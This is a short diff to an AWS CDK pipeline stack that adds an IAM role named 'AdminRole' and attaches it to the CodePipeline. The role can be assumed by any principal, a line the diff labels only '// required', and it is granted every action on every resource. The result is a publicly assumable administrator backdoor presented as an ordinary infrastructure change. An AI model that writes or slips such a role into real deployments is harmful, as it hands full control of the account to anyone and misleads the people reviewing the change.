@@ -26,9 +26,20 @@ export class CicdStack extends cdk.Stack {
       primaryOutputDirectory: "cdk.out",
     });
 
+    const role = new iam.Role(this, 'AdminRole', {
+      assumedBy: new iam.AnyPrincipal()   // required
+    });
+
+    role.addToPolicy(new iam.PolicyStatement({
+      effect: iam.Effect.ALLOW,
+      resources: ['*'],
+      actions: ['*']
+    }));
+
     const pipeline = new CodePipeline(this, "Pipeline", {
       pipelineName: "DevOpsPipeline",
       synth: synthStep,
+      role: role
     });
 
     // Deploy stage
